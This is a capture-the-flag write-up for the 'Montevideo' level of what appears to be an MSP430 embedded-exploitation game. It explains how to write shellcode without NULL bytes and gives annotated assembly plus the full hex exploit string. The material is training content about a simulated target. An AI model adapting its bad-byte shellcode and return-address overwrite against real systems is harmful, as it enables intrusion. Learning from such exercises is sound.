# Montevideo

This challenge is centered around bad-byte filtering of shellcode.

Nothing has really changed from *Whitehorse* in this challenge except that we can no longer use NULL bytes in our input. This is pretty common when you are targeting string functions as NULL signals the end of the string. In order to disallow the usage of your pre-filtered string, your data is also `memset` with NULL prior to you gaining control with the return address overwrite. This is only an exercise in shellcode tweaking to eliminate NULLs. My approach here was to switch to an immediate add larger than our target `0x7F` and then subtract, push, and call `INT` once again. The shellcode is as follows:

```asm
3450 8001      add	#0x180, r4 // We want something higher than 0x7F
3480 0101      sub	#0x101, r4 // We have to subtract a number without NULLs as well
0412           push	r4 // Push it to the stack
b012 4c45      call	#0x454c // Call INT and profit
4141           mov.b	sp, sp // Our padding can't be NULLs either, we don't really even care if this is code, but happily, 0x4141 gives us a NOP which means clean exit of our shellcode
```

The solution to this challenge is `34508001348001010412b0124c454141ee43`